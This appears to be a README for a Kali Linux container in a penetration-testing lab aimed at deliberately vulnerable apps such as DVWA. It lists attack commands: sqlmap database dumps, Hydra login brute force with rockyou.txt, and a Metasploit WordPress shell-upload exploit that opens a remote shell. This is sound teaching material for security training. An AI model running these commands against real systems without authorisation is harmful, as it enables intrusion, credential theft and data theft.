# Kali Linux Workstation

This directory contains persistent data for the Kali Linux container.

## Directories

- **workspace/**: Your working directory (persists between restarts)
- **tools/**: Custom tools and scripts
- **metasploit-db/**: Metasploit database (PostgreSQL data)

## Accessing Kali

```bash
docker exec -it kali-workstation /bin/bash
```

## Pre-installed Tools

The Kali container comes with essential penetration testing tools and all required dependencies:

- **nmap**: Network scanning and discovery
- **metasploit-framework**: Exploitation framework
- **sqlmap**: Automated SQL injection tool
- **nikto**: Web server scanner
- **dirb**: Web content scanner
- **hydra**: Password cracking tool
- **john**: John the Ripper password cracker
- **netcat**: Network utility
- **curl/wget**: HTTP clients
- **git**: Version control
- **nano**: Text editor
- **vim**: Advanced text editor

## Common Commands

### Network Scanning
```bash
# Basic port scan
nmap -sV dvwa

# Full port scan with OS detection
nmap -sV -sC -O -p- dvwa

# Scan all vulnerable apps
nmap -sV dvwa webgoat juiceshop
```

### Web Application Scanning
```bash
# Nikto scan
nikto -h http://dvwa

# Directory brute force
dirb http://dvwa /usr/share/wordlists/dirb/common.txt

# SSL scan
sslscan https://target.com
```

### SQL Injection Testing
```bash
# Basic SQLMap
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch

# With custom cookie (for authenticated pages)
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1" --cookie="security=low; PHPSESSID=xxx"

# Dump database
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1" --dbs --batch
```

### Metasploit
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf6 > search wordpress

# Use an exploit
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

# Show options
msf6 > show options

# Set target
msf6 > set RHOSTS dvwa
msf6 > set LHOST 172.20.0.5

# Run exploit
msf6 > exploit
```

### Password Cracking
```bash
# Hydra - HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt dvwa http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Installing Additional Tools

The Kali container is based on Kali Rolling, so you can install any Kali package:

```bash
# Update package list
apt update

# Install a tool
apt install -y aircrack-ng

# Search for tools
apt search exploit
```

## Workspace Organization

Create a project structure in your workspace:

```bash
cd /root/workspace

# Create project directories
mkdir -p projects/dvwa-test
mkdir -p projects/webgoat-test
mkdir -p notes
mkdir -p scripts
mkdir -p findings

# Example structure:
# workspace/
#   ├── projects/
#   │   ├── dvwa-test/
#   │   │   ├── scan-results/
#   │   │   ├── exploits/
#   │   │   └── notes.md
#   │   └── webgoat-test/
#   ├── notes/
#   ├── scripts/
#   └── findings/
```

## Custom Scripts

Add your custom scripts to `/root/tools/`:

```bash
# Example: Quick scan script
cat > /root/tools/quick-scan.sh << 'EOF'
#!/bin/bash
TARGET=$1
echo "Scanning $TARGET..."
nmap -sV -sC $TARGET
nikto -h http://$TARGET
EOF

chmod +x /root/tools/quick-scan.sh

# Use it
/root/tools/quick-scan.sh dvwa
```

## Metasploit Database Setup

The Metasploit database is pre-configured. To initialize:

```bash
# Start msfconsole
msfconsole

# Check database status
msf6 > db_status

# If not connected, initialize
msf6 > db_connect msf:msf@metasploit-db:5432/msf
```

## Tips and Tricks

### 1. Create aliases
```bash
# Add to ~/.bashrc
echo "alias ll='ls -lah'" >> ~/.bashrc
echo "alias scan='nmap -sV -sC'" >> ~/.bashrc
echo "alias dv='cd /root/workspace'" >> ~/.bashrc
source ~/.bashrc
```

### 2. Keep a testing checklist
```bash
cat > /root/workspace/checklist.md << 'EOF'
# Security Testing Checklist

## Reconnaissance
- [ ] Port scanning (nmap)
- [ ] Service enumeration
- [ ] Web server fingerprinting (nikto)
- [ ] Directory brute force (dirb)

## Web Application Testing
- [ ] SQL Injection
- [ ] XSS (Reflected, Stored, DOM)
- [ ] CSRF
- [ ] Authentication bypass
- [ ] File upload vulnerabilities
- [ ] Directory traversal
- [ ] XXE (XML External Entity)
- [ ] SSRF (Server-Side Request Forgery)

## API Testing
- [ ] Broken authentication
- [ ] Excessive data exposure
- [ ] Lack of rate limiting
- [ ] Security misconfiguration

## Reporting
- [ ] Document findings
- [ ] Include proof of concept
- [ ] Suggest remediation
EOF
```

### 3. Save your findings
```bash
# Template for findings
cat > /root/workspace/findings/template.md << 'EOF'
# Vulnerability Report

**Target**: [Application Name]
**Date**: [Date]
**Tester**: [Your Name]

## Vulnerability
- **Type**: [e.g., SQL Injection]
- **Severity**: [Critical/High/Medium/Low]
- **Location**: [URL or endpoint]

## Description
[Detailed description]

## Proof of Concept
```
[PoC code or steps]
```

## Impact
[What can an attacker do?]

## Remediation
[How to fix it]
EOF
```

## Resource Limits

The Kali container has:
- **CPU**: 2 cores
- **Memory**: 4GB RAM

If you need more resources, edit `docker-compose.yml`:
```yaml
kali-workstation:
  mem_limit: 8g  # Increase to 8GB
  cpus: 4        # Increase to 4 cores
```

## Troubleshooting

### Container won't start
```bash
docker logs kali-workstation
```

### Tools not working
```bash
# Update and reinstall
apt update
apt install --reinstall metasploit-framework
```

### Out of disk space
```bash
# Clean up
apt clean
apt autoremove
```

### Nmap library errors
```bash
# If you get "libblas.so.3: cannot open shared object file" errors
apt install -y libblas3 liblapack3 libblas-dev liblapack-dev
# Or reinstall nmap
apt install --reinstall nmap
```

## Learning Resources

- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)

Happy hunting! 🎯

